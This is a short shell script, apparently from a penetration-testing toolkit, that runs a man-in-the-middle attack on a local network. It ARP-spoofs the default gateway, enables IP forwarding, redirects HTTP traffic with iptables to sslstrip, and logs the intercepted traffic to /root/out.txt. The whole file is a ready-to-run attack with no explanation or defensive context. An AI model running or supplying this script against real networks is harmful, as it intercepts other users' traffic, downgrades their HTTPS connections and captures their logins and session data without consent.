#!/bin/sh

DEFAULT_ROUTE=$(ip route show default | awk '/default/ {print $3}')
IFACE=$(ip route show | awk '(NR == 2) {print $5}')
xterm -hold -e arpspoof -i $IFACE $DEFAULT_ROUTE &
echo -n 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000
xterm -hold -e /pentest/web/sslstrip/sslstrip.py -f -a -k -l 1000 -w /root/out.txt &
